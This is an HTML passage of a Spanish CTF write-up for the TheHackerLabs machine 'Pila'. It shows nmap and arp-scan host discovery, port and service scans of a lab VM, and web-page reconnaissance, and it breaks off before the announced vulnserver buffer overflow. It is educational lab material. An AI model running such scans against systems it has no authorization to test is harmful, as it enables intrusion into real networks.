@@ -1,0 +1,1742 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pila - TheHackerLabs · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/THL-writeup-pila/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Pila - TheHackerLabs">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/THL-writeup-pila/pila.jpg">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-cyberpunk/">
+          <span class="side-post-card-title">Cyberpunk</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-zapasguapas/">
+          <span class="side-post-card-title">Zapas Guapas</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Pila</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-grillo/">
+          <span class="side-post-card-title">Grillo</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-shined/">
+          <span class="side-post-card-title">Shined</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">TheHackerLabs / Medium Machine</div>
+    
+    <h1>Pila - TheHackerLabs</h1>
+    <div class="post-meta">15 February 2025 · 24 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/THL-writeup-pila/pila.jpg" alt="Pila - TheHackerLabs">
+  
+
+  
+  <p class="post-lead">Esta es una máquina que ocupa bastante talacha. Después de realizar los escaneos, vamos a analizar la página web que resulta tener un mensaje en el código fuente. Dicho mensaje nos manda a un directorio de la página web en donde descargamos un binario y un archivo DLL. Investigando y probando el binario, nos damos cuenta de que tenemos que aplicar Buffer Overflow. Realizamos esto utilizando Immunity Debugger, una máquina virtual Windows 7 y la Librería mona.py. Aplicando el Buffer Overflow, ganamos acceso a la máquina como el usuario Administrador.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>nc</code></li><li><code>strings</code></li><li><code>grep</code></li><li><code>Máquina Virtual Windows 7</code></li><li><code>Immunity Debugger</code></li><li><code>mona.py</code></li><li><code>bcdedit.exe</code></li><li><code>python3</code></li><li><code>pattern_create.rb</code></li><li><code>pattern_offset.rb</code></li><li><code>msfvenom</code></li><li><code>nasm_shell.rb</code></li><li><code>rlwrap</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Hosts">Descubrimiento de Hosts</a></li>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#Binario">Analizando Puerto 9999 y Binario vulnserver.exe Obtenido de Página Web</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Laboratorio">Preparando Laboratorio de Pruebas</a>
+          <ul>
+            <li><a href="#Windows7">Preparando Máquina Virtual Windows 7</a></li>
+            <li><a href="#Immunity">Instalando Immunity Debbuger</a></li>
+            <li><a href="#Libmona">Instalando Librería mona.py</a></li>
+          </ul>
+        </li>
+        <li><a href="#Vulnserver">Aplicando Buffer Overflow a Binario vulnserver.exe</a>
+          <ul>
+            <li><a href="#Immunity2">Preparando Binario en Immunity Debbuger</a></li>
+            <li><a href="#Cuarto">Cuarto Paso: Aplicando Fuzzing para Detectar Límites del Binario</a></li>
+            <li><a href="#Quinto">Quinto Paso: Identificando el offset del Binario vulnserver.exe</a></li>
+            <li><a href="#Sexto">Sexto Paso: Identificando Ubicación de Representación de Caracteres</a></li>
+            <li><a href="#Septimo">Séptimo Paso: Generación de Bytearrays, Creación de Exploit y Detección de Badchars</a></li>
+            <li><a href="#Octavo">Octavo Paso: Creación de Shellcode y Modificación de Exploit</a></li>
+            <li><a href="#Noveno">Noveno Paso: Busqueda de OpCode para Aplicar un Salto (JMP) al ESP</a></li>
+            <li><a href="#Décimo">Décimo Paso: Aplicando NOPs y Desplazamiento de Pila en Exploit</a></li>
+            <li><a href="#Undecimo">Undécimo Paso: Prueba y Ejecución de Exploit</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Hosts">Descubrimiento de Hosts</a></li>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#Binario">Analizando Puerto 9999 y Binario vulnserver.exe Obtenido de Página Web</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Laboratorio">Preparando Laboratorio de Pruebas</a>
+          <ul>
+            <li><a href="#Windows7">Preparando Máquina Virtual Windows 7</a></li>
+            <li><a href="#Immunity">Instalando Immunity Debbuger</a></li>
+            <li><a href="#Libmona">Instalando Librería mona.py</a></li>
+          </ul>
+        </li>
+        <li><a href="#Vulnserver">Aplicando Buffer Overflow a Binario vulnserver.exe</a>
+          <ul>
+            <li><a href="#Immunity2">Preparando Binario en Immunity Debbuger</a></li>
+            <li><a href="#Cuarto">Cuarto Paso: Aplicando Fuzzing para Detectar Límites del Binario</a></li>
+            <li><a href="#Quinto">Quinto Paso: Identificando el offset del Binario vulnserver.exe</a></li>
+            <li><a href="#Sexto">Sexto Paso: Identificando Ubicación de Representación de Caracteres</a></li>
+            <li><a href="#Septimo">Séptimo Paso: Generación de Bytearrays, Creación de Exploit y Detección de Badchars</a></li>
+            <li><a href="#Octavo">Octavo Paso: Creación de Shellcode y Modificación de Exploit</a></li>
+            <li><a href="#Noveno">Noveno Paso: Busqueda de OpCode para Aplicar un Salto (JMP) al ESP</a></li>
+            <li><a href="#Décimo">Décimo Paso: Aplicando NOPs y Desplazamiento de Pila en Exploit</a></li>
+            <li><a href="#Undecimo">Undécimo Paso: Prueba y Ejecución de Exploit</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Hosts">Descubrimiento de Hosts</h3>
+<p>Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.</p>
+<p>Lo haremos primero con <strong>nmap</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sn 192.168.1.0/24
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-02-13 13:37 CST
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.1.100
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0023s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Vamos a probar la herramienta <strong>arp-scan</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arp-scan -I eth0 -g 192.168.1.0/24
+</span></span><span style="display:flex;"><span>Interface: eth0, type: EN10MB, MAC: XX, IPv4: Tu_IP
+</span></span><span style="display:flex;"><span>Starting arp-scan 1.10.0 with <span style="color:#ae81ff">256</span> hosts <span style="color:#f92672">(</span>https://github.com/royhills/arp-scan<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>192.168.1.100	XX	PCS Systemtechnik GmbH
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span> packets received by filter, <span style="color:#ae81ff">0</span> packets dropped by kernel
+</span></span><span style="display:flex;"><span>Ending arp-scan 1.10.0: <span style="color:#ae81ff">256</span> hosts scanned in 2.112 seconds <span style="color:#f92672">(</span>121.21 hosts/sec<span style="color:#f92672">)</span>. <span style="color:#ae81ff">15</span> responded
+</span></span></code></pre></div><p>Encontramos nuestro objetivo y es:<code>192.168.1.100</code>.</p>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 192.168.1.100
+</span></span><span style="display:flex;"><span>PING 192.168.1.100 <span style="color:#f92672">(</span>192.168.1.100<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.100: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>1.38 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.100: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>0.634 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.100: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>0.733 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.100: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>0.999 ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 192.168.1.100 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3020ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 0.634/0.937/1.382/0.289 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa <strong>Windows</strong>, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 192.168.1.100 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-02-13 13:39 CST
+</span></span><span style="display:flex;"><span>Initiating ARP Ping Scan at 13:39
+</span></span><span style="display:flex;"><span>Scanning 192.168.1.100 <span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> port<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed ARP Ping Scan at 13:39, 0.06s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 13:39
+</span></span><span style="display:flex;"><span>Scanning 192.168.1.100 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 139/tcp on 192.168.1.100
+</span></span><span style="display:flex;"><span>Discovered open port 445/tcp on 192.168.1.100
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 192.168.1.100
+</span></span><span style="display:flex;"><span>Discovered open port 135/tcp on 192.168.1.100
+</span></span><span style="display:flex;"><span>Discovered open port 49152/tcp on 192.168.1.100
+</span></span><span style="display:flex;"><span>Discovered open port 49153/tcp on 192.168.1.100
+</span></span><span style="display:flex;"><span>Discovered open port 9999/tcp on 192.168.1.100
+</span></span><span style="display:flex;"><span>Discovered open port 49157/tcp on 192.168.1.100
+</span></span><span style="display:flex;"><span>Discovered open port 49154/tcp on 192.168.1.100
+</span></span><span style="display:flex;"><span>Discovered open port 49156/tcp on 192.168.1.100
+</span></span><span style="display:flex;"><span>Discovered open port 49155/tcp on 192.168.1.100
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 13:40, 37.62s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.1.100
+</span></span><span style="display:flex;"><span>Host is up, received arp-response <span style="color:#f92672">(</span>0.0017s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2025-02-13 13:39:52 CST <span style="color:#66d9ef">for</span> 38s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">47090</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>, <span style="color:#ae81ff">18434</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE      REASON
+</span></span><span style="display:flex;"><span>80/tcp    open  http         syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc        syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn  syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>9999/tcp  open  abyss        syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49152/tcp open  unknown      syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49153/tcp open  unknown      syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49154/tcp open  unknown      syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49155/tcp open  unknown      syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49156/tcp open  unknown      syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49157/tcp open  unknown      syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 37.89 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">176289</span> <span style="color:#f92672">(</span>7.757MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">47107</span> <span style="color:#f92672">(</span>1.884MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Hay pocos puertos abiertos de los que podamos investigar, me parece que la intrusión será por la página web, pero es curioso el <strong>puerto 9999</strong>.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p 80,135,139,445,9999,49152,49153,49154,49155,49156,49157 192.168.1.100 -oN targeted
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-02-13 13:41 CST
+</span></span><span style="display:flex;"><span>Stats: 0:00:53 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Service Scan
+</span></span><span style="display:flex;"><span>Service scan Timing: About 36.36% <span style="color:#66d9ef">done</span>; ETC: 13:44 <span style="color:#f92672">(</span>0:01:33 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.1.100
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0010s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>80/tcp    open  http          Microsoft IIS httpd 7.0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-title: 404: archivo o directorio no encontrado.
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/7.0
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>9999/tcp  open  vulnserver    Vulnserver
+</span></span><span style="display:flex;"><span>49152/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49153/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49154/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49155/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49156/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49157/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   2:0:2: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2025-02-13T19:42:41
+</span></span><span style="display:flex;"><span>|_  start_date: 2025-02-13T11:29:39
+</span></span><span style="display:flex;"><span>|_clock-skew: 2s
+</span></span><span style="display:flex;"><span>|_nbstat: NetBIOS name: WIN-LVJNVVHBWSR, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 66.89 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Me da curiosidad que la página web muestre un error en el escaneo. Además, parece que el <strong>servicio SMB</strong> no pide credenciales para poder entrar.</p>
+<p>Y más curioso es el <strong>puerto 9999</strong> que lo muestra como <strong>vulnserver</strong>, quizá podamos conectarnos a este servidor.</p>
+<p>Pero primero, vamos a ver la página web.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="HTTP">Analizando Servicio HTTP</h3>
+<p>Entremos:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura1.png">
+</p>
+<p>Pues si verdad, marca un error.</p>
+<p>Si revisamos el código fuente, encontraremos algo interesante:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura2.png">
+</p>
+<p>Parece ser una ruta.</p>
+<p>Vayamos a verla:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura3.png">
+</p>
+<p>Parece que de aquí podemos descargar unos archivos, entre ellos un binario.</p>
+<p>Descarguemos el binario y el <strong>DLL</strong>, los necesitaremos más adelante.</p>
+<h3 id="Binario">Analizando Puerto 9999 y Binario vulnserver.exe Obtenido de Página Web</h3>
+<p>Si recordamos, hay un puerto activo con un servidor que se llama <strong>vulnserver</strong>, mismo nombre que tiene el binario.</p>
+<p>Vamos a tratar de conectarnos a ese servidor usando <strong>netcat</strong>:</p>
